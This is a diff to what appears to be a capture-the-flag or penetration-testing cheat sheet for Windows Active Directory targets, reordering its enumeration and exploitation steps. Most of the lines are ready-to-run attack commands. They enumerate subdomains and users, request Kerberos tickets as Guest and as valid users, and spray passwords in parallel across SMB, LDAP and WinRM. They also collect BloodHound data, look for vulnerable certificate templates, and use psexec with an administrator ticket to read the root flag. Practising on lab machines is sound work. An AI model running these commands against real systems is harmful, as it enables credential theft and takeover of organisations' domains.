@@ -112,25 +112,14 @@ cat *VERSIONS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|
 
 # Exploitation
 ## Initial Enumeration
-dirsearch -u http://$TARGET --exclude-sizes 12B
-ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 4242 -t 50 -rate 5000
-
+dirsearch -u http://$TARGET --exclude-sizes 0
+ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 0 -t 50 -rate 5000
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' | grep -Ei 'dns'
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames
+impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 
--->> Spray Services
-(
-(nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success &)
-(nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success &)
-(nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success &)
-) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
-
--->> Valid Creds
+## Valid Creds
 sudo ntpdate -u $TARGET
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
@@ -140,6 +129,16 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
 certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
+
+## Spray Services
+(
+(nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
+(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success &)
+(nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
+(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success &)
+(nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
+(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success &)
+) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
 
 ## ROOT FLAG
 export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
